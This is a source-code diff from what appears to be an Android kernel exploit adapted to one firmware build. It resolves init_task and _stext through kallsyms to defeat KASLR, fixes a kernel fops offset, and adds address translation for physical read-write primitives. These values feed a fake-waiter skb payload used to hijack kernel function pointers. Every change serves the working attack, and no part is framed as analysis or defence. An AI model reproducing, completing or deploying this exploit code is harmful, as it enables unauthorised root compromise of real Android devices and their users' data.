@@ -16,6 +16,11 @@ static uint64_t rt_configfs_read_iter = 0;
 static uint64_t rt_configfs_bin_write_iter = 0;
 static uint64_t rt_copy_splice_read = 0;
 static uint64_t rt_noop_llseek = 0;
+/* init_task: EXPORT_SYMBOL'ed, so /proc/kallsyms resolves it reliably.
+   Resolved at runtime because the static INIT_TASK_OFF from the original
+   port (0x01c5c058) was a guess (swapper-string - 0x600) and does not point
+   at init_task in the V14.0.4.0 image. */
+static uint64_t rt_init_task = 0;
 
 static uint64_t resolve_kallsyms(const char *name) {
   /* Use grep to efficiently search the full kallsyms (2MB+) */
@@ -118,6 +123,33 @@ void resolve_missing_offsets(void) {
       pr_warning("  ashmem_misc_fops: NOT in kallsyms - need vmlinux offset\n");
   }
 
+  /* init_task is EXPORT_SYMBOL'ed, so this resolves on any kernel with
+   * readable /proc/kallsyms. The static fallback is a zero-filled .data
+   * address in the V14.0.4.0 image (kept only so the task-list walk and
+   * fake-waiter anchor degrade gracefully). */
+  rt_init_task = resolve_sym_addr("init_task");
+  if (rt_init_task)
+    pr_info("  init_task: resolved 0x%lx\n", rt_init_task);
+  else
+    pr_warning("  init_task: NOT in kallsyms - using static fallback\n");
+
+  /* With readable kallsyms (root / kptr_restrict=0), derive the KASLR base
+   * directly: BASE = _stext - 0x800 (verified on-device 2026-08-16:
+   * runtime _stext 0xffffff86e3280800, BASE 0xffffff86e3280000). This makes
+   * the prefetch side-channel unnecessary when running under Magisk. */
+  if (!kaslr_done) {
+    uint64_t stext = resolve_sym_addr("_stext");
+    if (stext) {
+      kaslr_base = stext - 0x800;
+      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+      kaslr_done = 1;
+      pr_info("  kaslr_base: derived from _stext: %#lx slide=%#lx\n",
+              kaslr_base, kaslr_slide);
+    } else {
+      pr_warning("  _stext: NOT readable - will use slide side-channel\n");
+    }
+  }
+
   pr_info("Offset resolution done.\n");
 }
 
@@ -160,7 +192,23 @@ uint64_t get_security_hook_heads_addr(void) {
 }
 uint64_t get_ashmem_misc_fops_addr(void) {
   if (rt_ashmem_misc_fops) return rt_ashmem_misc_fops;
-  return data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF);
+  /* ASHMEM_MISC_FOPS_OFF is ashmem_misc (minor 0xff @ +0, verified via
+   * ashmem_init ADRP); the fops pointer slot is at +0x10. */
+  return data_addr(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF) + 0x10;
+}
+
+/* init_task runtime VA (already KASLR-slid when resolved from kallsyms).
+ * Used for the fake-waiter task anchor and the task-list walk head. */
+uint64_t get_init_task_addr(void) {
+  if (rt_init_task) return rt_init_task;
+  return text_addr(KIMAGE_TEXT_BASE + INIT_TASK_OFF);
+}
+
+/* Convert a runtime (KASLR-slid) kernel VA into its direct-map alias for the
+ * pipe physrw primitives. Mirrors p0_data_alias() but for slid addresses:
+ * alias = PAGE_OFFSET | ((va - kaslr_base) + P0_KERNEL_PHYS_DELTA). */
+uintptr_t rt_data_alias(uintptr_t rt_va) {
+  return P0_PAGE_OFFSET | ((rt_va - kaslr_base) + P0_KERNEL_PHYS_DELTA);
 }
 
 static struct kernelsnitch_shared_state *ks;
@@ -627,9 +675,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uintptr_t write_pc = fake_fops;
   uintptr_t write_right = get_ashmem_misc_fops_addr();
   uintptr_t write_left = 0;
-  uint64_t waiter_task = text_addr(INIT_TASK);
+  uint64_t waiter_task = get_init_task_addr();
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
-  uint64_t pi_top_task = text_addr(INIT_TASK);
+  uint64_t pi_top_task = get_init_task_addr();
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
